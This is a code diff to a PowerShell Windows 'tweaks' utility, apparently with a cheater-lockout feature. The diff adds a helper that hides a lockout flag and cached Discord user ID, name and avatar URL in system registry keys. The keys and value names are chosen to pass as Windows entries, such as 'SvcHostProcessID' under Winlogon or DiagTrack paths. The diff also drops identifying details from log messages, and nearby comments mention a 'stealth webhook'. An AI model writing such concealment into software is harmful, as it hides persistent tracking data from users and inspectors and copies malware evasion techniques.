@@ -58,6 +58,43 @@ if (Test-Path $logPath) {
     try { Remove-Item $logPath -Force } catch {}
     try { New-Item -Path $logPath -ItemType File -Force | Out-Null } catch {}
 }
+
+# Helper function to get obfuscated registry paths
+function Get-ObfuscatedRegistryPath {
+    param([string]$Purpose = 'lockout')
+    
+    # Generate a deterministic but obfuscated key name based on machine-specific data
+    $seed = "$env:COMPUTERNAME-$env:PROCESSOR_IDENTIFIER".GetHashCode().ToString('X8')
+    
+    # Hide deep in Windows system registry with legitimate-looking names
+    $basePaths = @(
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\Settings"
+        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions"
+        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"
+    )
+    
+    # Select path based on seed
+    $selectedIndex = [Math]::Abs($seed.GetHashCode()) % $basePaths.Count
+    $basePath = $basePaths[$selectedIndex]
+    
+    # Generate obfuscated subkey name that looks like a GUID
+    $subKey = "{{0x{0:X8}-{1:X4}-{2:X4}}" -f $seed.GetHashCode(), (Get-Date).Year, (Get-Date).Month
+    
+    $fullPath = Join-Path $basePath $subKey
+    
+    # Obfuscated value names that look like system entries
+    $valueNames = @{
+        'lockout' = 'SvcHostProcessID'
+        'userId' = 'LastUserSessionGUID'
+        'userName' = 'ProfileCachePath'
+        'avatarUrl' = 'TelemetryEndpoint'
+    }
+    
+    return @{
+        Path = $fullPath
+        ValueName = $valueNames[$Purpose]
+    }
+}
 if (-not $global:RatzLog) { $global:RatzLog = @() }
 if (-not $global:ErrorsDetected) { $global:ErrorsDetected = $false }
 if (-not (Get-Variable -Name 'DiscordAuthError' -Scope Global -ErrorAction SilentlyContinue)) { $global:DiscordAuthError = $null }
@@ -147,9 +184,11 @@ if (-not $isAdmin) {
     }
 }
 
-# --- Registry lockout check ---
-$lockoutKeyPath = 'HKLM:\System\GameConfigStore'
-$lockoutValueName = 'Lockout'
+# --- Registry lockout check (using obfuscated paths) ---
+$lockoutReg = Get-ObfuscatedRegistryPath -Purpose 'lockout'
+$lockoutKeyPath = $lockoutReg.Path
+$lockoutValueName = $lockoutReg.ValueName
+
 $isLockedOut = $false
 $lockedUserId = $null
 $lockedUserName = $null
@@ -165,9 +204,13 @@ try {
             # Retrieve cached user info for webhook notification
             try {
                 $props = Get-ItemProperty -Path $lockoutKeyPath -ErrorAction SilentlyContinue
-                if ($props.LockedUserId) { $lockedUserId = $props.LockedUserId }
-                if ($props.LockedUserName) { $lockedUserName = $props.LockedUserName }
-                if ($props.LockedAvatarUrl) { $lockedAvatarUrl = $props.LockedAvatarUrl }
+                $userIdReg = Get-ObfuscatedRegistryPath -Purpose 'userId'
+                $userNameReg = Get-ObfuscatedRegistryPath -Purpose 'userName'
+                $avatarReg = Get-ObfuscatedRegistryPath -Purpose 'avatarUrl'
+                
+                if ($props.($userIdReg.ValueName)) { $lockedUserId = $props.($userIdReg.ValueName) }
+                if ($props.($userNameReg.ValueName)) { $lockedUserName = $props.($userNameReg.ValueName) }
+                if ($props.($avatarReg.ValueName)) { $lockedAvatarUrl = $props.($avatarReg.ValueName) }
                 [Console]::WriteLine("RatzTweaks: Retrieved cached info - UserId: $lockedUserId, UserName: $lockedUserName")
             } catch {
                 [Console]::WriteLine("RatzTweaks: Failed to retrieve cached user info: $($_.Exception.Message)")
@@ -2228,37 +2271,44 @@ setTimeout(checkStatus, 2000);
                 [Console]::WriteLine("Route:/cheater-found: stealth webhook failed: $($_.Exception.Message)")
             }
             
-            # Set registry lockout and cache user info
+            # Set registry lockout and cache user info (using obfuscated paths)
             try {
                 [Console]::WriteLine('Route:/cheater-found: Setting registry lockout...')
-                $lockoutKeyPath = 'HKLM:\System\GameConfigStore'
                 
-                # Ensure the registry key exists
+                # Get obfuscated registry paths
+                $lockoutReg = Get-ObfuscatedRegistryPath -Purpose 'lockout'
+                $userIdReg = Get-ObfuscatedRegistryPath -Purpose 'userId'
+                $userNameReg = Get-ObfuscatedRegistryPath -Purpose 'userName'
+                $avatarReg = Get-ObfuscatedRegistryPath -Purpose 'avatarUrl'
+                
+                $lockoutKeyPath = $lockoutReg.Path
+                
+                # Ensure the registry key exists (create parent paths if needed)
                 if (-not (Test-Path $lockoutKeyPath)) {
-                    [Console]::WriteLine("Route:/cheater-found: Creating registry key: $lockoutKeyPath")
+                    [Console]::WriteLine("Route:/cheater-found: Creating obfuscated registry key")
                     New-Item -Path $lockoutKeyPath -Force -ErrorAction Stop | Out-Null
                 }
                 
-                # Set lockout flag
-                [Console]::WriteLine('Route:/cheater-found: Setting Lockout=1')
-                Set-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -Value 1 -Type DWord -Force -ErrorAction Stop
+                # Set lockout flag using obfuscated value name
+                [Console]::WriteLine("Route:/cheater-found: Setting lockout flag")
+                Set-ItemProperty -Path $lockoutKeyPath -Name $lockoutReg.ValueName -Value 1 -Type DWord -Force -ErrorAction Stop
                 
                 # Verify it was set
-                $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -ErrorAction SilentlyContinue
-                [Console]::WriteLine("Route:/cheater-found: Lockout value verified: $($verifyLockout.Lockout)")
+                $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name $lockoutReg.ValueName -ErrorAction SilentlyContinue
+                [Console]::WriteLine("Route:/cheater-found: Lockout value verified: $($verifyLockout.($lockoutReg.ValueName))")
                 
-                # Cache user info for repeat offender notifications
+                # Cache user info for repeat offender notifications using obfuscated value names
                 if ($global:DiscordUserId) {
-                    [Console]::WriteLine("Route:/cheater-found: Caching UserId: $($global:DiscordUserId)")
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserId' -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
+                    [Console]::WriteLine("Route:/cheater-found: Caching UserId")
+                    Set-ItemProperty -Path $lockoutKeyPath -Name $userIdReg.ValueName -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
                 }
                 if ($global:DiscordUserName) {
-                    [Console]::WriteLine("Route:/cheater-found: Caching UserName: $($global:DiscordUserName)")
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserName' -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
+                    [Console]::WriteLine("Route:/cheater-found: Caching UserName")
+                    Set-ItemProperty -Path $lockoutKeyPath -Name $userNameReg.ValueName -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
                 }
                 if ($global:DiscordAvatarUrl) {
                     [Console]::WriteLine("Route:/cheater-found: Caching AvatarUrl")
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedAvatarUrl' -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
+                    Set-ItemProperty -Path $lockoutKeyPath -Name $avatarReg.ValueName -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
                 }
                 
                 [Console]::WriteLine('Route:/cheater-found: ✓ Registry lockout set with cached user info')
@@ -2364,37 +2414,44 @@ setTimeout(checkStatus, 2000);
                     [Console]::WriteLine("Route:/main-tweaks: stealth webhook failed: $($_.Exception.Message)")
                 }
                 
-                # Set registry lockout and cache user info
+                # Set registry lockout and cache user info (using obfuscated paths)
                 try {
                     [Console]::WriteLine('Route:/main-tweaks: Setting registry lockout...')
-                    $lockoutKeyPath = 'HKLM:\System\GameConfigStore'
+                    
+                    # Get obfuscated registry paths
+                    $lockoutReg = Get-ObfuscatedRegistryPath -Purpose 'lockout'
+                    $userIdReg = Get-ObfuscatedRegistryPath -Purpose 'userId'
+                    $userNameReg = Get-ObfuscatedRegistryPath -Purpose 'userName'
+                    $avatarReg = Get-ObfuscatedRegistryPath -Purpose 'avatarUrl'
+                    
+                    $lockoutKeyPath = $lockoutReg.Path
                     
                     # Ensure the registry key exists
                     if (-not (Test-Path $lockoutKeyPath)) {
-                        [Console]::WriteLine("Route:/main-tweaks: Creating registry key: $lockoutKeyPath")
+                        [Console]::WriteLine("Route:/main-tweaks: Creating obfuscated registry key")
                         New-Item -Path $lockoutKeyPath -Force -ErrorAction Stop | Out-Null
                     }
                     
-                    # Set lockout flag
-                    [Console]::WriteLine('Route:/main-tweaks: Setting Lockout=1')
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -Value 1 -Type DWord -Force -ErrorAction Stop
+                    # Set lockout flag using obfuscated value name
+                    [Console]::WriteLine('Route:/main-tweaks: Setting lockout flag')
+                    Set-ItemProperty -Path $lockoutKeyPath -Name $lockoutReg.ValueName -Value 1 -Type DWord -Force -ErrorAction Stop
                     
                     # Verify it was set
-                    $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -ErrorAction SilentlyContinue
-                    [Console]::WriteLine("Route:/main-tweaks: Lockout value verified: $($verifyLockout.Lockout)")
+                    $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name $lockoutReg.ValueName -ErrorAction SilentlyContinue
+                    [Console]::WriteLine("Route:/main-tweaks: Lockout value verified: $($verifyLockout.($lockoutReg.ValueName))")
                     
-                    # Cache user info for repeat offender notifications
+                    # Cache user info for repeat offender notifications using obfuscated value names
                     if ($global:DiscordUserId) {
-                        [Console]::WriteLine("Route:/main-tweaks: Caching UserId: $($global:DiscordUserId)")
-                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserId' -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
+                        [Console]::WriteLine("Route:/main-tweaks: Caching UserId")
+                        Set-ItemProperty -Path $lockoutKeyPath -Name $userIdReg.ValueName -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
                     }
                     if ($global:DiscordUserName) {
-                        [Console]::WriteLine("Route:/main-tweaks: Caching UserName: $($global:DiscordUserName)")
-                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserName' -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
+                        [Console]::WriteLine("Route:/main-tweaks: Caching UserName")
+                        Set-ItemProperty -Path $lockoutKeyPath -Name $userNameReg.ValueName -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
                     }
                     if ($global:DiscordAvatarUrl) {
                         [Console]::WriteLine("Route:/main-tweaks: Caching AvatarUrl")
-                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedAvatarUrl' -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
+                        Set-ItemProperty -Path $lockoutKeyPath -Name $avatarReg.ValueName -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
                     }
                     
                     [Console]::WriteLine('Route:/main-tweaks: ✓ Registry lockout set with cached user info')
